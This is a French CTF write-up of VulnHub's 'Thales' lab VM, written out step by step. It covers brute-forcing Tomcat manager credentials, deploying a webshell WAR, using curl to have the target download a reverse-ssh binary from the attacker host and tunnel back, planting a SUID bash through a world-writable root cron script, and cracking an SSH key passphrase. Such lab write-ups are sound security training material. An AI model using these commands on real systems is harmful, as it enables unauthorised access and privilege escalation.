# Solution du CTF Thales de VulnHub

[Ce CTF](https://www.vulnhub.com/entry/thales-1,749/) proposé sur VulnHub a été créé par [machineboy414](https://twitter.com/machineboy141) qui est déjà l'auteur de la série de CTFs KB-VULN pour lesquels j'ai déjà écrit quelques writeups.

On lance notre scanner de ports favoris et... oh ! un Tomcat !

```
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 192.168.56.39
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8c19ab9172a571d86d751d8f65dfe132 (RSA)
|   256 906ea0eed5296cb97b05dbc6825c19bf (ECDSA)
|_  256 544d7be8f97f21343eed0fd9fe93bf00 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.52
|_http-title: Apache Tomcat/9.0.52
|_http-favicon: Apache Tomcat
MAC Address: 08:00:27:72:5B:09 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

J'ai beau avoir croisé quelques Tomcat dans les CTFs il fallait que je retrouve la liste d'identifiants habituels pour cette application.

Les différents liens sur le site mènent en effet presque tous à une demande d'authentification. Notemment si on tente d'accèder à `/manager`.

J'ai recherché un outil de brute force pour Tomcat mais j'aurais très bien avoir recours sau classique Hydra. J'ai finalement jeté mon dévolu sur [ce petit script Python](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) qui n'a besoin que de deux dépendances (`requests` et `termcolor`).

Je lui ait fournit en entrée deux wordlists provenant de fuzzdb, l'une pour les noms d'utilisateurs et l'autre pour les mots de passe.

```bash
$ python mgr_brute.py -U http://192.168.56.39:8080/ -u tomcat_mgr_default_users.txt -p tomcat_mgr_default_pass.txt -P /manager

[+] Atacking.....

[+] Success!!
[+] Username : b'tomcat'
[+] Password : b'role1'
```

Une fois connecté je remarque qu'il y a une entrée */shell/* dans les applis déployées. La page n'affichant que du vide j'ai tenté de débusquer un éventuel paramètre valide pour le script:

```bash
$ ffuf -u "http://192.168.56.39:8080/shell/?FUZZ=id" -w common_query_parameter_names.txt -fs 6
```

Cela n'a malheureusement mené nul part. J'aurais aimé pouvoir télécharger le fichier war correspondant au déploiement depuis le Tomcat mais c'est visiblement impossible.

J'ai donc du employer la classique technique de déploiement d'une archive war que j'ai trouvé pour l'occasion [sur ce projet github](https://github.com/p0dalirius/Tomcat-webshell-application).

Une fois déployé on utilise la commande fournie en exemple:

```bash
curl -X POST 'http://192.168.56.39:8080/webshell/api' --data "action=exec&cmd=id"
{"stdout":"uid=999(tomcat) gid=999(tomcat) groups=999(tomcat)\n","stderr":"","exec":["/bin/bash","-c","id"]}
```

Je rappatrie ensuite un reverse-ssh sur la machine:

```bash
curl -X POST 'http://192.168.56.39:8080/webshell/api' --data "action=exec&cmd=wget -O /opt/tomcat/reverse-ssh http://192.168.56.1:8000/reverse-sshx64"
```

Je lance d'abord reverse-ssh en écoute sur ma machine:

```bash
./reverse-sshx64 -l -p 9999 -v
```

puis je lance le tunnel depuis la VM:

```bash
curl -X POST 'http://192.168.56.39:8080/webshell/api' --data "action=exec&cmd=/opt/tomcat/reverse-ssh -p 9999 192.168.56.1"
```

Le tunnel est bien établi :

```
2022/11/03 17:04:47 Starting ssh server on :9999
2022/11/03 17:04:47 Success: listening on [::]:9999
2022/11/03 17:05:05 Successful authentication with password from reverse@192.168.56.39:54578
2022/11/03 17:05:05 Attempt to bind at 127.0.0.1:8888 granted
2022/11/03 17:05:05 New connection from 192.168.56.39:54578: tomcat on miletus reachable via 127.0.0.1:8888
```

Je n'ai plus qu'à me connecter au port forwardé localement:

```bash
$ ssh -p 8888 127.0.0.1
The authenticity of host '[127.0.0.1]:8888 ([127.0.0.1]:8888)' can't be established.
RSA key fingerprint is SHA256:ouF/tUjdBRFlHLkk1CgdY/xcer/6epVHyR9k0gDiNeI.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:8888' (RSA) to the list of known hosts.
sirius@127.0.0.1's password: 
tomcat@miletus:/$ id
uid=999(tomcat) gid=999(tomcat) groups=999(tomcat)
```

Je fouille direct dans le dossier `/home` et je vois des éléments intéressants:

```bash
tomcat@miletus:/$ ls /home/thales/ -al
total 52
drwxr-xr-x 6 thales thales 4096 Oct 14  2021 .
drwxr-xr-x 3 root   root   4096 Aug 15  2021 ..
-rw------- 1 thales thales  457 Oct 14  2021 .bash_history
-rw-r--r-- 1 thales thales  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 thales thales 3771 Apr  4  2018 .bashrc
drwx------ 2 thales thales 4096 Aug 15  2021 .cache
drwx------ 3 thales thales 4096 Aug 15  2021 .gnupg
drwxrwxr-x 3 thales thales 4096 Aug 15  2021 .local
-rw-r--r-- 1 thales thales  807 Apr  4  2018 .profile
-rw-r--r-- 1 root   root     66 Aug 15  2021 .selected_editor
drwxrwxrwx 2 thales thales 4096 Aug 16  2021 .ssh
-rw-r--r-- 1 thales thales    0 Oct 14  2021 .sudo_as_admin_successful
-rw-r--r-- 1 root   root    107 Oct 14  2021 notes.txt
-rw------- 1 thales thales   33 Aug 15  2021 user.txt
```

Le fichier *notes.txt* contient le message suivant :

> I prepared a backup script for you.
> The script is in this directory "/usr/local/bin/backup.sh".
> Good Luck.

On peut lire la clé privée SSH de l'utilisateur mais pas écrire à l'intérieur (SSH aurait sans doute gueulé sinon).

Cette clé privée est toutefois protégée par une passphrase donc laissons la de côté.

On voit que le script cité appartient à root mais est world-writable :

```bash
tomcat@miletus:/home/thales/.ssh$ ls -al /usr/local/bin/backup.sh
-rwxrwxrwx 1 root root 612 Oct 14  2021 /usr/local/bin/backup.sh
```

Il créé des archives compressées du dossier /opt/tomcat :

```bash
#!/bin/bash
####################################
#
# Backup to NFS mount script.
#
####################################

# What to backup. 
backup_files="/opt/tomcat/"

# Where to backup to.
dest="/var/backups"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```

Et visiblement le script est exécuté par root :

```bash
tomcat@miletus:/home/thales/.ssh$ ls -al /var/backups
total 36508
drwxr-xr-x  2 root root     4096 Nov  3 14:56 .
drwxr-xr-x 13 root root     4096 Aug  6  2020 ..
-rw-r--r--  1 root root    33750 Oct 14  2021 apt.extended_states.0
-rw-r--r--  1 root root     3614 Aug 15  2021 apt.extended_states.1.gz
-rw-r--r--  1 root root 11573824 Aug 16  2021 miletus-Monday.tgz
-rw-r--r--  1 root root 11572776 Aug 15  2021 miletus-Sunday.tgz
-rw-r--r--  1 root root 14182418 Nov  3 18:10 miletus-Thursday.tgz
```

La date du dernier fichier semble changer toutes les 5 minutes.

Je rajoute deux petites commandes en fin de script :

```bash
echo "cp /bin/bash /tmp/; chmod 4755 /tmp/bash" >> /usr/local/bin/backup.sh
```

On obtient notre shell attendu rapidement :

```bash
tomcat@miletus:/home/thales/.ssh$ ls -al /tmp/bash
-rwsr-xr-x 1 root root 1113504 Nov  3 18:20 /tmp/bash
tomcat@miletus:/home/thales/.ssh$ /tmp/bash -p
bash-4.4# id
uid=999(tomcat) gid=999(tomcat) euid=0(root) groups=999(tomcat)
bash-4.4# cd /root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt
3a1c85bebf8833b0ecae900fb8598b17
bash-4.4# cat /home/thales/user.txt
a837c0b5d2a8a07225fd9905f5a0e9c4
```

## Alternative happy end

On peut finalement casser la passphrase de la clé SSH :

```
./john --wordlist=rockyou.txt  ssh_key.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
vodka06          (/tmp/thales.key)     
1g 0:00:00:00 DONE (2022-11-03 18:24) 1.020g/s 2918Kp/s 2918Kc/s 2918KC/s vodka121..vodka&l
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

La connexion avec la clé échoue (sans doute à cause des mauvaises permissions) mais depuis le compte *tomcat* on peut *su* vers *thales* avec le mot de passe.

On ne peut pas utiliser sudo depuis cet utilisateur. La ligne qui nous aurait aidé a été commentée :

```
# Allow members of group sudo to execute any command
#sudo   ALL=(ALL:ALL) ALL
```

L'utilisateur fait toutefois partie du groupe lxd donc il doit être possible de faire une escalade de privlège par là.

En conclusion un CTF simple mais plutôt réaliste.

*Publié le 3 novembre 2022*
